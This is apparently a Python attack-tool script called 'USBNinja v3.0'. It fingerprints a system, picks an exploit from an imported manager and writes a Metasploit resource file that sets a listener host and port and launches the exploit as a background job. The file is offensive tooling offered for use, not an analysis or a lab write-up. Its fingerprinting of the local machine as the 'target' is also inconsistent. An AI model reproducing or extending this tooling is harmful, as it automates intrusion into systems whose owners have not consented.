#!/usr/bin/env python3
"""
USBNinja v3.0 - Ultra-Automated USB Attack Framework
Integrated with System Fingerprinting and Dynamic Exploit Selection
"""

import os
import sys
import argparse
from pathlib import Path
from core.fingerprint import SystemFingerprint
from core.exploit_manager import ExploitManager

# Re-using Style and MetasploitInterface from v2.0
class Style:
    MSF_RED = '\033[38;5;196m'
    MSF_GREEN = '\033[38;5;82m'
    MSF_BLUE = '\033[38;5;33m'
    END = '\033[0m'
    BOLD = '\033[1m'

    @staticmethod
    def success(text): return f"{Style.MSF_GREEN}[+]{Style.END} {text}"
    @staticmethod
    def info(text): return f"{Style.MSF_BLUE}[*]{Style.END} {text}"
    @staticmethod
    def error(text): return f"{Style.MSF_RED}[-]{Style.END} {text}"

class USBNinjaV3:
    def __init__(self):
        self.exploit_mgr = ExploitManager()
        self.fingerprint = SystemFingerprint.get_info()

    def auto_engage(self, lhost, lport):
        print(Style.BOLD + "\n--- USBNinja v3.0 Auto-Engagement Mode ---" + Style.END)
        print(Style.info(f"Target Detected: {self.fingerprint['os']} ({self.fingerprint['arch']})"))
        
        exploits = self.exploit_mgr.get_best_exploit(self.fingerprint['os'])
        if not exploits:
            print(Style.error("No specific exploits found for this OS. Falling back to generic payloads."))
            return

        print(Style.info(f"Found {len(exploits)} high-reliability exploits. Selecting best..."))
        best = exploits[0]
        print(Style.success(f"Selected: {best['name']}"))
        
        # In a real scenario, this would trigger msfrpc or msfconsole
        print(Style.info(f"Generating automated deployment script for {best['module']}..."))
        self._generate_deployment_package(best, lhost, lport)

    def _generate_deployment_package(self, exploit, lhost, lport):
        output_path = Path("deploy_v3")
        output_path.mkdir(exist_ok=True)
        
        script_content = f"""# USBNinja v3 Deployment Script
# Exploit: {exploit['name']}
# Target: {self.fingerprint['os']}
# Callback: {lhost}:{lport}

use {exploit['module']}
set LHOST {lhost}
set LPORT {lport}
set TARGET 0
exploit -j -z
"""
        (output_path / "deploy.rc").write_text(script_content)
        print(Style.success(f"Deployment package created at: {output_path}/"))

def main():
    parser = argparse.ArgumentParser(description='USBNinja v3.0 - Automated USB Attack Framework')
    parser.add_argument('--auto', action='store_true', help='Run in full auto-detection mode')
    parser.add_argument('--lhost', required=True, help='Listener IP')
    parser.add_argument('--lport', type=int, default=4444, help='Listener Port')
    
    args = parser.parse_args()
    
    ninja = USBNinjaV3()
    if args.auto:
        ninja.auto_engage(args.lhost, args.lport)
    else:
        print(Style.info("Manual mode selected. Use --auto for full automation."))

if __name__ == "__main__":
    main()
